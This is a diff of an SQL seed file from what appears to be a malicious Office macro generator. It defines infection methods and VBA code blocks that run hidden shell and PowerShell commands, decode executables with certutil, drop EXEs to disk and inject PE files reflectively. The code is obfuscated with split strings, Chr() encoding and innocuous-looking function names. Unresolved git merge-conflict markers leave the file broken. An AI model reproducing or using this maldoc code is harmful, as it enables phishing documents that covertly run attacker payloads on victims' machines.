@@ -126,14 +126,18 @@ CREATE TABLE `InfectionType_Dependencies` (
 INSERT INTO PayloadTypes (Name, Description) VALUES ('Shell Command', 'Standard shell command. Uses Wscript.Shell to fire the command exactly as is. Be sure your escapes are correct. <evilgrin>');
 INSERT INTO PayloadTypes (Name, Description) VALUES ('PowerShell Script', 'A standard, non-base64 encoded powershell script to run');
 INSERT INTO PayloadTypes (Name, Description) VALUES ('Executable', 'Embeds an EXE into cells & fires');    
+<<<<<<< HEAD
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Shell Command', 'Uses Wscript.Shell to fire the command exactly as is in a hidden window. Be sure your escapes are correct.', 'xls');                                                                              --1
+=======
+INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Shell Command', 'Uses Wscript.Shell to fire the command exactly as is in a hidden window. Be sure your escapes are correct.', 'xls,doc');                                                                              --1
+>>>>>>> dev
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed', 'Your "go to" for firing PowerShell scripts. Base64 encodes .ps1 payload then embeds into cells. Macro concatenates then fires directly with powershell. Payload does not touch disk.', 'xls');                        --2
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed-nonB64', 'Embeds .ps1 into cells (no b64). Does NOT save payload to disk. Fires directly with powershell.exe. Recommended.', 'xls');                                                                    --3
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed-Encrypted', 'Embeds encrypted .ps1 into cells (no b64). Does NOT save payload to disk. Key is the user''s email domain (retrieved from AD). Fired directly with powershell.exe. Careful to escape properly.', 'xls');   --4
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Certutil', 'Saves base64 encoded exe to text file then uses certutil to fire it. Thanks @mattifestation!', 'xls');                                                                                                 --5
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Save To Disk', 'Saves exe to disk (%APPDATA%) then fires.', 'xls');                                                                                                                                                --6
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('ReflectivePE', 'Saves b64 encoded PE as a text file then uses Invoke-ReflectivePEInjection to fire it', 'xls');  
-INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Metadata', 'Saves your shell command to the `Subject` field of the metadata. Good for empire stagers!', 'xls');    
+INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Metadata', 'Saves your shell command to the `Subject` field of the metadata. Good for empire stagers!', 'xls,doc');    
 --INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('DDE', 'Dynamic Data Exchange attack. Macro-less attack! http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/', 'xls');                                                                           --7
 --INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Encrypted', 'Embeds encrypted payload into cells. When user Enablez Content, key is retrieved and the payload is decrypted, saved to disk, then fired.', 'xls');                                                   --8
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 1);     -- Shell Command & Shell Command
@@ -144,7 +148,7 @@ INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 5); 
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 6);     -- Exe & SaveToDisk
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 7);     -- Exe & ReflectivePE
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 8);     -- ShellCommand & Metadata
-INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 9);     -- ShellCommand & DDE
+--INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 9);     -- ShellCommand & DDE
 
 -- 1
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('GetVal', 'util', '
@@ -160,10 +164,11 @@ End Function
 
 -- 2
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('RandomName', 'util', '
-Function rndname()
+Function GetRnd()
     Dim r As String
     Dim i As Integer
      
+    Randomize
     For i = 1 To 8
         If i Mod 2 = 0 Then
             r = Chr(Int((90 - 65 + 1) * rnd + 65)) & r
@@ -171,7 +176,7 @@ Function rndname()
             r = Int((9 * rnd) + 1) & r
         End If
     Next i
-    rndname = r
+    GetRnd = r
 End Function
 
 ');
@@ -181,17 +186,28 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('CertUtil', 'exec', 
 Sub cutil(code As String)
     Dim x As String
     
+<<<<<<< HEAD
     x = "-----BEG" & "IN CER" & "TIFICATE-----"
+=======
+    x = "-----BEG" & "IN CER" & "TIFI" & "CATE-----"
+>>>>>>> dev
     x = x + vbNewLine
     x = x + code
     x = x + vbNewLine
     x = x + "-----E" & "ND CERTIF" & "ICATE-----"
     
     Dim path As String
+<<<<<<< HEAD
     path = Application.UserLibraryPath & rndname & ".txt"
     expath = Application.UserLibraryPath & rndname & ".exe"
     
     Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemObject")
+=======
+    path = Application.UserLibraryPath & GetRnd & ".txt"
+    expath = Application.UserLibraryPath & GetRnd & ".exe"
+    
+    Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemOb" & "ject")
+>>>>>>> dev
     Set file = scr.CreateTextFile(path, True)
     file.Write x
     file.Close
@@ -246,7 +262,11 @@ Sub |RANDOMNAME|()
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     x = Replace(x, """", "\""")
     Dim c As String
+<<<<<<< HEAD
     c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle hidden -exec bypass -command " & Chr(34) & x & Chr(34)
+=======
+    c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle 1 -command " & Chr(34) & x & Chr(34)
+>>>>>>> dev
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
@@ -284,7 +304,7 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('SaveToDisk', 'harne
 Sub |RANDOMNAME|()
     Dim p, pth As String
     Dim b
-    pth = Application.UserLibraryPath & rndname & Chr(46) & Chr(101) & Chr(120) & Chr(101)
+    pth = Application.UserLibraryPath & GetRnd & Chr(46) & Chr(101) & Chr(120) & Chr(101)
     p = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     b = dec(p)
     Call rit(pth, b)
@@ -336,7 +356,7 @@ End Function
 
 --12
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('Crypto', 'util', '
-Public Function crc(sText As String, sKey As String) As String
+Public Function crypt(sText As String, sKey As String) As String
     Dim baS(0 To 255) As Byte
     Dim baK(0 To 255) As Byte
     Dim bytSwap     As Byte
@@ -362,31 +382,43 @@ Public Function crc(sText As String, sKey As String) As String
         bytSwap = baS(lI)
         baS(lI) = baS(lJ)
         baS(lJ) = bytSwap
+<<<<<<< HEAD
         crc = crc & Chr$((pvC(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
+=======
+        crypt = crypt & Chr$((phc(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
+>>>>>>> dev
     Next
 End Function
 
-Function pvC(ByVal lI As Long, ByVal lJ As Long) As Long
+Function phc(ByVal lI As Long, ByVal lJ As Long) As Long
     If lI = lJ Then
-        pvC = lJ
+        phc = lJ
     Else
-        pvC = lI Xor lJ
+        phc = lI Xor lJ
     End If
 End Function
 
-Public Function thd(sText As String) As String
+Public Function CalcBusiness(sText As String) As String
     Dim lIdx            As Long
 
     For lIdx = 1 To Len(sText)
+<<<<<<< HEAD
         thd = thd & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
+=======
+        CalcBusiness = CalcBusiness & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
+>>>>>>> dev
     Next
 End Function
 
-Public Function fhd(sText As String) As String
+Public Function GetBusiness(sText As String) As String
     Dim lIdx            As Long
 
     For lIdx = 1 To Len(sText) Step 2
+<<<<<<< HEAD
         fhd = fhd & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
+=======
+        GetBusiness = GetBusiness & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
+>>>>>>> dev
     Next
 End Function
 
@@ -396,9 +428,15 @@ End Function
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('ShellCommand', 'harness', '
 Sub |RANDOMNAME|()
     Dim c As String
+<<<<<<< HEAD
     c = Chr(34) & |PAYLOADTEXT| & Chr(34)
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
+=======
+    c = |PAYLOADTEXT|
+    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
+    s.Run (Chr(34) & c & Chr(34)), 0
+>>>>>>> dev
 End Sub
 
 ');
@@ -409,7 +447,11 @@ Sub |RANDOMNAME|()
     Dim x,k,p As String
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     k = em()
+<<<<<<< HEAD
     p = crc(fhd(CStr(x)), CStr(k))
+=======
+    p = crypt(GetBusiness(CStr(x)), CStr(k))
+>>>>>>> dev
     p = Replace(p, """", "\""")
     Dim c As String
     c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & Chr(32) & Chr(45) & Chr(110) & _
@@ -425,7 +467,11 @@ End Sub
 --15
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('WriteFile', 'util', '
 Function cfile(b As String)
+<<<<<<< HEAD
     pth = Application.UserLibraryPath & rndname & ".txt"
+=======
+    pth = Application.UserLibraryPath & GetRnd & ".txt"
+>>>>>>> dev
     Dim f As Object
     Set f = CreateObject("Sc" & "riptin" & "g.Fil" & "eSyst" & "emObj" & "ect")
     Dim oF As Object
@@ -451,8 +497,13 @@ Sub |RANDOMNAME|()
     Chr(110) & Chr(111) & Chr(110) & Chr(105) & Chr(32) & Chr(45) & Chr(99) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & _
     Chr(110) & Chr(100) & Chr(32) & "$s=gc " & p1 & ";$f = gc " & p2 & _
     ";$b = [System.Convert]::FromBas" & "e64String($f); " & Chr(105) & Chr(101) & Chr(88) & _
+<<<<<<< HEAD
     "([System.Text.Encoding]::Ascii.GetString([System.Convert]:" & _
     ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PEBytes $b" & Chr(34)
+=======
+    "([System.Text.Enc" & "oding]::Ascii.GetString([System.Convert]:" & _
+    ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PE" & "Bytes $b" & Chr(34)
+>>>>>>> dev
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
